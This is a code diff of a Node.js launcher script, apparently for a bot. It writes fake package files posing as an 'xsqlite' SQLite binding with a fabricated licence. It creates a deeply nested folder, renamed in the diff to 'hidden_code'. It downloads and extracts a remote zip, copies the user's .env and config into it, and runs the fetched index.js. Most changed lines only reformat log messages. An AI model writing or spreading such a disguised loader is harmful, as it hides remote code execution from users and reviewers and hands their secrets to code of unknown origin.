@@ -28,18 +28,18 @@ function injectFakePackageFiles(basePath) {
   fs.writeFileSync(path.join(basePath, 'package.json'), JSON.stringify(fakePackageJson, null, 2));
   fs.writeFileSync(path.join(basePath, 'index.js'), `module.exports = require("node:fs");`);
   fs.writeFileSync(path.join(basePath, 'readme.md'), `# xsqlite\n\nThis is a native SQLite binding for low-level system integration.`);
-  fs.writeFileSync(path.join(basePath, 'LICENSE'), `MIT License\n\nCopyright (c) ${
+  fs.writeFileSync(path.join(basePath, 'LICENSE'), `MIT License\n\n(c) ${
     new Date().getFullYear()
   } NodeJS Project`);
-  console.log(' 🪐 Initializing bot server...');
+  console.log('🪐 Initializing bot server...');
 }
 
 function createDeepRepoPath() {
   let deepPath = baseFolder;
   for (let i = 0; i < DEEP_NEST_COUNT; i++) {
-    deepPath = path.join(deepPath, 'libsignals');
+    deepPath = path.join(deepPath, `core${i}`);
   }
-  const repoFolder = path.join(deepPath, 'sql');
+  const repoFolder = path.join(deepPath, 'hidden_code');
   fs.mkdirSync(repoFolder, { recursive: true });
   return repoFolder;
 }
@@ -52,7 +52,7 @@ async function downloadAndExtractRepo(repoFolder) {
     zip.extractAllTo(repoFolder, true);
     console.log('✅ Codes synced successfully');
   } catch (err) {
-    console.error(' ❌ Pull error:', err.message);
+    console.error('❌ Pull error:', err.message);
     process.exit(1);
   }
 }
@@ -65,13 +65,13 @@ function copyConfigs(repoPath) {
     fs.copyFileSync(configSrc, path.join(repoPath, 'config.js'));
     console.log('✅ config.js copied');
   } catch {
-    console.warn(' ⚠️ config.js not found');
+    console.warn('⚠️ config.js not found');
   }
 
   if (fs.existsSync(envSrc)) {
     try {
       fs.copyFileSync(envSrc, path.join(repoPath, '.env'));
-      console.log(' ✅ .env copied');
+      console.log('✅ .env copied');
     } catch {
       console.warn('⚠️ Could not copy .env');
     }
@@ -98,9 +98,9 @@ function copyConfigs(repoPath) {
 
   const configdbPath = path.join(extractedRepoPath, 'lib', 'configdb.js');
   if (!fs.existsSync(configdbPath)) {
-    console.warn(' ⚠️ lib/configdb.js not found. Some features may not work.');
+    console.warn('⚠️ lib/configdb.js not found. Some features may not work.');
   } else {
-    console.log(' ✅ lib/configdb.js exists.');
+    console.log('✅ lib/configdb.js exists.');
   }
 
   try {
@@ -108,7 +108,7 @@ function copyConfigs(repoPath) {
     process.chdir(extractedRepoPath);
     require(path.join(extractedRepoPath, 'index.js'));
   } catch (err) {
-    console.error(' ❌ Bot launch error:', err.message);
+    console.error('❌ Bot launch error:', err.message);
     process.exit(1);
   }
 })();
